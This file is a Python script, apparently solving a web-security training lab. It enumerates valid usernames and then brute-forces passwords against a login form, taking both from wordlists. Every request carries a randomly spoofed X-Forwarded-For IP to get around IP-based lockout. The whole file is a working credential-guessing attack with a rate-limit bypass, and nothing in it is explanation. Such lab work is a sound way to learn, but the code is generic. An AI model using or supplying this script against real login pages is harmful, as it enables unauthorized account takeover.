import requests
from random import randint

from bs4 import BeautifulSoup

# Set the URL and necessary headers
url = 'https://0acf008c046d05f88001128b00810010.web-security-academy.net/login'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
cookies = {'session': 'P30aEztLc6sUtvR4lMOLcgMAJJhOncVc'}


# Generate different IP addresses to simulate different users
def random_ip_generator():
    return "{}.{}.{}.{}".format(randint(0, 255), randint(0, 255), randint(0, 255), randint(0, 255))


with open("usernames.txt", "r") as f:
    usernames = f.read().splitlines()
#
found_username = None
for username in usernames:
    ip = random_ip_generator()
    data = {'username': f'{username}', 'password': 'nothing'}

    # Set up the headers with the modified "X-Forwarded-for" header
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'X-Forwarded-For': ip
    }

    # Submit the login request with the given password and IP
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    html = BeautifulSoup(response.text, "html.parser")
    message = html.select(".is-warning")
    if "Invalid username or password." in message[0]:
        print(f"username: {username} doesn't exists!")
    else:
        print(f'username: {username} found!')
        found_username = username
        break

with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()

found_password = None
for password in passwords:
    ip = random_ip_generator()
    data = {'username': f'{found_username}', 'password': password}

    # Set up the headers with the modified "X-Forwarded-for" header
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'X-Forwarded-For': ip
    }

    # Submit the login request with the given password and IP
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    html = BeautifulSoup(response.text, "html.parser")
    message = html.select(".is-warning")
    if len(message) > 0:
        print(f"password: {password} for username: {found_username} was incorrect!")
    else:
        print(f'password successfully found with username: {found_username} and password: {password}')
        found_password = password
        break
